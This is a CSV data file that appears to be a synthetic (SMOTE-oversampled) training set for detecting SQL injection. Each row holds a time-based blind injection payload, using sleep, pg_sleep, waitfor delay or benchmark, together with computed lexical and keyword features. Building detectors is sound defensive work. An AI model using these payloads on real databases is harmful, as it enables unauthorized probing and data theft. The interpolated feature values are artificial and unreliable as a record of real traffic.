id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000013,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.9218296608780129,87.04428911180905,20.650876014426974,2.9835076857119622,30.76622306131464,2.0,43.46447103246069,10.813595018033718,0.35070043124294703,0.023301470081629833,0.5022907923554712,0.1237073063199519,1.1102230246251565e-16,0.6508760144269746,0.0,0.0,1.0,0.0,0.0,9.162719003606743,1.3877787807814457e-17,0.0,0.0,0.9999999999999999,0.0,0.16271900360674363,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000014,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.2781823147799525,115.20339475171596,28.92406789503432,4.013590430206968,59.02576527089229,3.9240678950343186,35.48135790068638,16.77220368510296,0.5121981472879685,0.03436250158351238,0.3060231377868943,0.14741621334162472,3.9999999999999996,0.0,2.0,0.0,0.0,0.0,0.0,5.696271580137276,1.3877787807814457e-17,0.07593210496568115,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.39631166816540914,40.11690408029585,15.495373760169063,2.820923642563884,10.49537376016906,1.1261565599577343,20.0,8.495373760169063,0.26041921039001226,0.02873422875033807,0.5004748338551527,0.210371727004497,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,3.4953737601690618,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.25230422197956076,130.47041861652284,31.970598836467325,3.7465198520302465,51.27931105356043,10.117604654130707,52.07350290883169,17.0,0.392892644231728,0.0774256609150885,0.3992921942112504,0.13038950064193316,2.9705988364673233,0.0,0.0,0.0,1.0,1.0,0.0,9.014700581766338,1.3877787807814457e-17,0.029401163532676966,0.014700581766338428,3.9705988364673233,1.0,0.0,0.0,0.9852994182336616,0.0,1.0,1.0,0.0,0.0,0.0,0.9852994182336615,2.9852994182336614,0.0,0.9852994182336617,1.9852994182336614,0.9852994182336615,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.01470058176633846,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.01470058176633846,0.01470058176633846,7.985299418233662
SMOTE_000017,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.398452446679672,43.59064336621766,16.0,2.8479450058351907,11.0,0.0,21.93483717104371,10.655806195173952,0.25390352451037107,1.3877787807814457e-17,0.5010184331542847,0.2450780423353442,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,0.0,3.6558061951739522,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5418371277088291,39.25292830589448,16.0,3.171715506669536,13.0,0.0,15.710773588245402,10.54215471764908,0.33314281218476965,1.3877787807814457e-17,0.3976850404763268,0.2691721473389035,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.54215471764908,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000019,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,1.061245013511095,112.33414286161113,28.666464284597218,3.3561505030165644,36.33353571540278,10.0,52.55609524107408,13.44451190513426,0.32364669138394,0.0892687168290182,0.467299865748526,0.11978472603851577,1.0,0.0,0.0,0.0,1.0,1.0,0.0,9.44451190513426,1.3877787807814457e-17,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.4445119051342604,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.444511905134261
SMOTE_000020,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.6474679669007273,81.19616157639305,25.54487296612016,3.482676741067937,22.398720525464352,12.471796745792258,35.32564430513645,11.0,0.2740495784610646,0.15080389398528166,0.43540624821187746,0.1397402793417763,1.1102230246251565e-16,0.691025406775968,2.0,0.0,0.0,1.3089745932240322,0.0,5.308974593224032,0.6910254067759679,1.0,0.0,3.308974593224032,0.0,0.6910254067759678,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3089745932240321,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.308974593224032
SMOTE_000021,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.17122256180213621,43.98209310101595,16.66069770033865,3.0735693930385453,13.0,0.6606977003386492,19.3213954006773,11.0,0.2958903649136469,0.014682171118636664,0.439058693656169,0.25036877031154736,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000022,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.06618341628408912,100.0,33.39124534338382,4.078687665603489,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,2.2249208974396417,64.33967426839826,22.813094462662335,3.4541983971455092,14.813094462662336,14.834918567099564,26.87856677597402,7.813094462662336,0.23987690774332693,0.22919901669134135,0.4075326743504931,0.12339140121483856,1.1102230246251565e-16,0.39563517911255464,0.7912703582251094,0.0,0.0,1.6043648208874455,0.0,3.813094462662336,1.3877787807814457e-17,0.0,0.6043648208874454,2.3956351791125545,0.0,0.39563517911255464,0.3956351791125547,0.6043648208874453,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,1.5873182509000785,47.62198002113152,17.56763273111482,3.022327701667715,12.567632731114822,1.5676327311148217,22.702898193344463,10.78381636555741,0.2647671262979648,0.031352654622296416,0.47600891751798297,0.2278713015617558,1.1102230246251565e-16,3.5676327311148213,0.0,0.0,0.0,1.0,0.0,3.7838163655574104,1.567632731114821,0.864734537770358,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7838163655574106,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.3411592389732878,86.45065422994023,27.65665889371264,3.473929967422756,16.06866822125747,20.862663557485053,37.725327114970106,11.793995336227582,0.18605611342504824,0.2413193642765103,0.43634200469440876,0.13628251760403273,0.9313317787425275,0.0,0.0,0.0,0.0,1.0,0.0,6.931331778742528,0.9313317787425275,0.0,1.0,0.9999999999999999,0.9313317787425275,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9313317787425275,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.08080268691330204,100.0,33.47766762072346,4.080416111150282,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,3.3178677499996225,118.78157006233792,29.82869097980734,3.6959747789967254,41.5909942458318,12.895078693590214,47.295497122915904,17.0,0.3417225469136675,0.11488302482854303,0.397806758565462,0.14558766969232753,3.3618848366987764,0.0,0.0,0.0,0.6381151633012232,1.3618848366987768,0.0,7.914345489903669,1.3877787807814457e-17,0.0,0.3618848366987768,4.723769673397554,1.0,0.0,0.0,0.6381151633012232,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.2762303266024464,0.0,1.0,1.2762303266024462,0.6381151633012232,0.3618848366987768,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.552460653204893
SMOTE_000028,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,4.035034242232753,124.79168975188202,33.89393099931563,3.981696019431866,45.31820700205311,18.996172246749254,44.89775875256638,15.579551750513277,0.36173178622630386,0.15588787941555152,0.35782422564549227,0.12455610871265235,3.0,0.0,0.0,0.0,0.5265172501710921,1.473482749828908,0.0,7.106069000684368,1.3877787807814457e-17,0.0,0.47348274982890776,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.4734827498289077,1.0,2.053034500342184,0.0,1.0,1.5265172501710922,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5265172501710922,0.4734827498289078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.579551750513277
SMOTE_000029,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.340626815881576,37.8395046555011,23.486625387958426,4.2057366623172445,16.0,2.0,6.866253879584253,12.97325077591685,0.43364199255112384,0.05420524906889048,0.1648019281503508,0.347350830229635,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.9732507759168505,1.3877787807814457e-17,4.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.48662538795842525,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000030,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.7809056950344232,72.9440196989401,24.729007387102534,3.4305624020150454,19.24300246236751,10.0,32.45801477420507,11.243002462367512,0.2640964165712661,0.13737917686050974,0.44433133148536585,0.15419307508285832,1.1102230246251565e-16,1.0,2.0,0.0,0.0,1.0,0.0,5.243002462367512,0.9999999999999999,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.24300246236751152,0.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
